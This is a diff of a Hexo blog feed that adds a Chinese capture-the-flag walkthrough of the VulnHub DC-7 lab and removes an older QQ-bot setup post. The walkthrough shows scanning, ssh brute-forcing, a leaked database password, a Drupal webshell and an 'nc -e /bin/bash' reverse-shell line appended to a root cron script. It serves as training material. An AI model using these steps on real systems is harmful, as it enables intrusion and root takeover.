@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://lnng.top/"/>
-  <updated>2020-11-22T08:54:28.948Z</updated>
+  <updated>2020-11-22T13:38:20.927Z</updated>
   <id>https://lnng.top/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>DC7-靶机</title>
+    <link href="https://lnng.top/posts/eb0d.html"/>
+    <id>https://lnng.top/posts/eb0d.html</id>
+    <published>2020-11-22T10:03:00.000Z</published>
+    <updated>2020-11-22T13:38:20.927Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="基本环境搭建"><a href="#基本环境搭建" class="headerlink" title="基本环境搭建"></a>基本环境搭建</h2><p>靶机下载地址:<a href="https://download.vulnhub.com/dc/DC-7.zip" target="_blank" rel="noopener">https://download.vulnhub.com/dc/DC-7.zip</a></p><h2 id="基本信息收集"><a href="#基本信息收集" class="headerlink" title="基本信息收集"></a>基本信息收集</h2><pre><code>nmap -sS -A 192.168.124.0/24</code></pre><pre><code>Nmap scan report for 192.168.124.151Host is up (0.00037s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey: |   2048 d0:02:e9:c7:5d:95:32:ab:10:99:89:84:34:3d:1e:f9 (RSA)|   256 d0:d6:40:35:a7:34:a9:0a:79:34:ee:a9:6a:dd:f4:8f (ECDSA)|_  256 a8:55:d5:76:93:ed:4f:6f:f1:f7:a1:84:2f:af:bb:e1 (ED25519)80/tcp open  http    Apache httpd 2.4.25 ((Debian))|_http-generator: Drupal 8 (https://www.drupal.org)| http-robots.txt: 22 disallowed entries (15 shown)| /core/ /profiles/ /README.txt /web.config /admin/ | /comment/reply/ /filter/tips /node/add/ /search/ /user/register/ | /user/password/ /user/login/ /user/logout/ /index.php/admin/ |_/index.php/comment/reply/|_http-server-header: Apache/2.4.25 (Debian)|_http-title: Welcome to DC-7 | D7MAC Address: 00:0C:29:52:A9:5B (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT     ADDRESS1   0.37 ms 192.168.124.151</code></pre><p>发现开放了22，80端口系统linux，进一步扫描，没发现其他端口</p><pre><code>nmap 192.168.124.151 -p 1-65535</code></pre><p>爆破ssh</p><pre><code>nmap --script=ssh-brute 192.168.124.151</code></pre><p>查看80端口进行进一步信息的探测CMS是Drupal8，而且告诉我们不是暴力破解<br><img src="/images/pasted-251.png" alt="upload successful"></p><h2 id="查找漏洞"><a href="#查找漏洞" class="headerlink" title="查找漏洞"></a>查找漏洞</h2><p>尝试了msf中的漏洞不行exploit-db中根据版本来也不行<br>百度一下说这个提示搜索一下这个人，然后发现了github，然后找到了源码<a href="https://github.com/Dc7User/staffdb" target="_blank" rel="noopener">github源码地址</a><br><img src="/images/pasted-252.png" alt="upload successful"><br><img src="/images/pasted-253.png" alt="upload successful"><br>然后我们在config.php中发现了连接数据库的账号密码，尝试使用ssh连接,可以看到爆破前面爆破账号密码失败</p><pre><code>&lt;?php    $servername = &quot;localhost&quot;;    $username = &quot;dc7user&quot;;    $password = &quot;MdR3xOgB7#dW&quot;;    $dbname = &quot;Staff&quot;;    $conn = mysqli_connect($servername, $username, $password, $dbname);?&gt;</code></pre><p><img src="/images/pasted-254.png" alt="upload successful"></p><h2 id="提取"><a href="#提取" class="headerlink" title="提取"></a>提取</h2><p>先搜寻一下文件的基本信息,在mbox中发现一个root执行的文件(百度的妈耶看不到)</p><pre><code>cat mbox</code></pre><p><img src="/images/pasted-255.png" alt="upload successful"></p><pre><code>cat /opt/scripts/backups.sh#!/bin/bashrm /home/dc7user/backups/*cd /var/www/html/drush sql-dump --result-file=/home/dc7user/backups/website.sqlcd ..tar -czf /home/dc7user/backups/website.tar.gz html/gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sqlgpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gzchown dc7user:dc7user /home/dc7user/backups/*rm /home/dc7user/backups/website.sqlrm /home/dc7user/backups/website.tar.gz</code></pre><p>发现应该是一个备份的sh脚本<br>看一下权限www-data和root都是有权限的<br><img src="/images/pasted-256.png" alt="upload successful"><br>所以有思路了，如果我们获得www-data的权限向这个脚本执行任务，那么我们就可以反弹root权限，因为会以root权限定时启动<br>看着这个备份脚本可以发现是一个drush配置的命令，它可以改变用户名密码</p><pre><code>drush sql-dump --result-file=/home/dc7user/backups/website.sql</code></pre><p>所以尝试修改一下密码</p><pre><code>cd /var/www/htmldrush user-password admin --password=&quot;123456&quot;</code></pre><p><img src="/images/pasted-257.png" alt="upload successful"><br>登录尝试，登录成功<br><img src="/images/pasted-258.png" alt="upload successful"><br>发现这个位置是支持扩展的，所以我们想要创建一个webshell可以借助插件，看wp要去下载一个php的插件<br><img src="/images/pasted-259.png" alt="upload successful"><br>插件下载地址：<a href="https://www.drupal.org/project/php" target="_blank" rel="noopener">https://www.drupal.org/project/php</a><br>下载gz格式上传，然后点如图的标识<br><img src="/images/pasted-260.png" alt="upload successful"><br>然后勾上下图的东西，点击最下方的install<br><img src="/images/pasted-261.png" alt="upload successful"><br>回到主页，点击下图的东西，创建一个文章<br><img src="/images/pasted-262.png" alt="upload successful"></p><p><img src="/images/pasted-263.png" alt="upload successful"><br>随便写个木马<br><img src="/images/pasted-265.png" alt="upload successful"><br>注意下面的text format要选择php code<br>然后蚁剑连接即可<br><img src="/images/pasted-266.png" alt="upload successful"><br>再反弹给kali吧，其实可以直接再webshell中反弹shell<br><img src="/images/pasted-267.png" alt="upload successful"><br>反弹交互shell</p><pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>然后将反弹shell的脚本写入定时启动的sh中，反弹root的shell</p><pre><code>echo &quot;nc -e /bin/bash 192.168.124.139 7777&quot; &gt;&gt;  /opt/scripts/backups.sh</code></pre><p><img src="/images/pasted-268.png" alt="upload successful"><br>读取flag</p><pre><code>cd /rootlstheflag.txtcat theflag.txt888       888          888 888      8888888b.                             888 888 888 888 888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 888  d8b  888          888 888      888    888                            888 888 888 888 888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 Congratulations!!!Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all thosewho have provided feedback, and all those who have taken the time to complete these littlechallenges.I&#39;m sending out an especially big thanks to:@4nqr34z@D4mianWayne@0xmzfr@theart42If you enjoyed this CTF, send me a tweet via @DCAU7.</code></pre><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.anquanke.com/post/id/187876#h3-3" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187876#h3-3</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;基本环境搭建&quot;&gt;&lt;a href=&quot;#基本环境搭建&quot; class=&quot;headerlink&quot; title=&quot;基本环境搭建&quot;&gt;&lt;/a&gt;基本环境搭建&lt;/h2&gt;&lt;p&gt;靶机下载地址:&lt;a href=&quot;https://download.vulnhub.com/dc/DC-7.z
+      
+    
+    </summary>
+    
+    
+      <category term="web安全" scheme="https://lnng.top/categories/web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="DC" scheme="https://lnng.top/tags/DC/"/>
+    
+      <category term="靶机" scheme="https://lnng.top/tags/%E9%9D%B6%E6%9C%BA/"/>
+    
+  </entry>
   
   <entry>
     <title>DC6-靶机</title>
@@ -543,33 +571,6 @@
       <category term="xss" scheme="https://lnng.top/tags/xss/"/>
     
       <category term="靶场" scheme="https://lnng.top/tags/%E9%9D%B6%E5%9C%BA/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>qq机器人</title>
-    <link href="https://lnng.top/posts/e895.html"/>
-    <id>https://lnng.top/posts/e895.html</id>
-    <published>2020-06-30T09:54:54.000Z</published>
-    <updated>2020-07-16T04:29:22.605Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h2><p>在其他群看见qq机器人很好玩，就打算自己做一个，想让其推送网站的文章，方便阅读</p><h2 id="所需环境"><a href="#所需环境" class="headerlink" title="所需环境"></a>所需环境</h2><p>为了让qq机器人能24小时运行建议搭建在服务器上或者vps上</p><p>手里刚好有个服务器我就搭建在服务器上了</p><p>服务器环境：centos7</p><h2 id="准备配置环境"><a href="#准备配置环境" class="headerlink" title="准备配置环境"></a>准备配置环境</h2><h3 id="安装宝塔"><a href="#安装宝塔" class="headerlink" title="安装宝塔"></a>安装宝塔</h3><p>因为是centos系统没有图形化页面，个人建议安装宝塔(如果你Linux命令很熟悉可以跳过)</p><p>安装方法：<a href="https://www.bt.cn/bbs/thread-19376-1-1.html" target="_blank" rel="noopener">https://www.bt.cn/bbs/thread-19376-1-1.html</a></p><p>找到自己对应的系统，复制安装代码到虚拟终端，回车即可</p><p>等待一会终端出现一个ip地址(就是你服务器的ip+8888好像)和账号密码访问登录到宝塔</p><p>按照我选择的安装插件即可(建议：编译安装)</p><p><img src="https://Lmg66.github.io/img/72.png" alt="图片"></p><h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><p>酷q要运行在docker里</p><h4 id="安装方法一-通过宝塔安装"><a href="#安装方法一-通过宝塔安装" class="headerlink" title="安装方法一(通过宝塔安装)"></a>安装方法一(通过宝塔安装)</h4><p>宝塔页面软件商城搜索docker，安装即可</p><p><img src="https://Lmg66.github.io/img/73.png" alt="图片"></p><h4 id="安装方法二-命令行安装"><a href="#安装方法二-命令行安装" class="headerlink" title="安装方法二(命令行安装)"></a>安装方法二(命令行安装)</h4><p>安装方法：<a href="https://www.runoob.com/docker/centos-docker-install.html" target="_blank" rel="noopener">https://www.runoob.com/docker/centos-docker-install.html</a><br>找到自己对应的系统，复制安装代码到虚拟终端，回车即可</p><h3 id="安装python3-gt-3-7"><a href="#安装python3-gt-3-7" class="headerlink" title="安装python3&gt;=3.7"></a>安装python3&gt;=3.7</h3><p>因为酷q中的cqhttp插件需要python3环境这里顺便安装了</p><p>安装方法(centos7系统)：<a href="https://blog.csdn.net/u013214212/article/details/81540840" target="_blank" rel="noopener">https://blog.csdn.net/u013214212/article/details/81540840</a></p><p>注意：有的系统自带的有python2或者python3，建议百度按照自己系统安装或升级python3.7以上的方法</p><h2 id="安装酷q"><a href="#安装酷q" class="headerlink" title="安装酷q"></a>安装酷q</h2><p>终端命令pull 酷Q的镜像：</p><pre><code>docker pull coolq/wine-coolq</code></pre><p>如果拉取镜像比较慢，可以尝试换源</p><p>换源参考文章：<a href="https://www.cnblogs.com/Neeo/articles/12726262.html" target="_blank" rel="noopener">https://www.cnblogs.com/Neeo/articles/12726262.html</a></p><p>创建用于存放coolQ数据的文件夹：</p><pre><code>mkdir /root/coolq-data</code></pre><p>然后运行 酷 Q 镜像：</p><pre><code>docker run --name=coolq -d -p 8080:9000 -v /root/coolq-data:/home/user/coolq -e VNC_PASSWD=12345678 -e COOLQ_ACCOUNT=10000 coolq/wine-coolq</code></pre><p>其中 VNC_PASSWD 指定链接 VNC 密码，远程访问酷 Q 界面时要用到，COOLQ_ACCOUNT 指的是酷 Q 默认登录密码</p><p>登录酷 Q 界面，在浏览器输入你服务器ip+9000，访问输入 vnc 密码后就可以看到酷 Q 登录界面了</p><h3 id="docker的酷q的运维"><a href="#docker的酷q的运维" class="headerlink" title="docker的酷q的运维"></a>docker的酷q的运维</h3><h4 id="方法一-命令行-："><a href="#方法一-命令行-：" class="headerlink" title="方法一(命令行)："></a>方法一(命令行)：</h4><p>查看酷 Q 运行情况，主要是酷 Q 运行中产生的日志，可以用来排错</p><pre><code>docker logs coolq</code></pre><p>启动和停止酷 Q</p><pre><code>docker start coolqdocker stop coolq</code></pre><h4 id="方法二-宝塔"><a href="#方法二-宝塔" class="headerlink" title="方法二(宝塔):"></a>方法二(宝塔):</h4><p>docker管理器即可</p><p><img src="https://Lmg66.github.io/img/73.png" alt="图片"></p><h2 id="安装nonebot-cqhttp-个性化定制你的qq机器人"><a href="#安装nonebot-cqhttp-个性化定制你的qq机器人" class="headerlink" title="安装nonebot cqhttp 个性化定制你的qq机器人"></a>安装nonebot cqhttp 个性化定制你的qq机器人</h2><p>参考nonebot官网:<a href="https://nonebot.cqp.moe/" target="_blank" rel="noopener">https://nonebot.cqp.moe/</a></p><p>注：官网是最好的教程</p><h2 id="挂起脚本，实现24小时运行"><a href="#挂起脚本，实现24小时运行" class="headerlink" title="挂起脚本，实现24小时运行"></a>挂起脚本，实现24小时运行</h2><p>ssh连接，断开的时候，python脚本也会断开，解决这个问题需要将脚本后台挂起</p><p>进入程序入口，挂起命令</p><pre><code>nohup python bot.py &amp;</code></pre><p>然后回车即可，会看见一个id，就是后台运行id,若要关掉需要使用</p><pre><code>ps -aux</code></pre><p>可以找到你运行的进程id，然后用命令关掉</p><pre><code>kill id</code></pre><h2 id="个人qq机器人-已经开源"><a href="#个人qq机器人-已经开源" class="headerlink" title="个人qq机器人(已经开源)"></a>个人qq机器人(已经开源)</h2><p>开源地址:<a href="https://github.com/Lmg66/QQrobot" target="_blank" rel="noopener">https://github.com/Lmg66/QQrobot</a></p><p>实现的功能</p><p> 1.天气，食用方法”小安+天气” </p><pre><code>文件目录：plugins/weather</code></pre><p> 2.图灵对话，食用方+你想说的话” </p><pre><code> plugins/tuling.py</code></pre><p> 3.信息的获取，食用方法”小安+碧蓝航线”还可以+知乎+steam+新番+<em>年</em>月有什么新番+先知社区 </p><pre><code> plugins下看文件的命名基本都是功能</code></pre><p> 4.游戏功能,食用方法”小安+谁是卧底”—-&gt;测试ing  </p><p> 5.以图搜番，食用方法”小安+以图搜番”</p><pre><code>  plugins/anime_search_photo.py</code></pre><p> 6.音乐功能,食用方法”小安+来首”——&gt;此处有bug不建议食用会让小安卡住 </p><pre><code> plugins/musice</code></pre><p> 7.早安，午安，晚安  </p><pre><code> plugins/one_talk</code></pre><p> 还有隐藏功能哦，不妨输入”小安+来个涩图”试试有惊喜哦，嘻嘻嘻’)</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言:&quot;&gt;&lt;/a&gt;前言:&lt;/h2&gt;&lt;p&gt;在其他群看见qq机器人很好玩，就打算自己做一个，想让其推送网站的文章，方便阅读&lt;/p&gt;
-&lt;h2 id=&quot;所需环境&quot;&gt;&lt;a href=&quot;#
-      
-    
-    </summary>
-    
-    
-      <category term="qq机器人" scheme="https://lnng.top/categories/qq%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
-    
-    
-      <category term="qq机器人的搭建" scheme="https://lnng.top/tags/qq%E6%9C%BA%E5%99%A8%E4%BA%BA%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
     
   </entry>
   
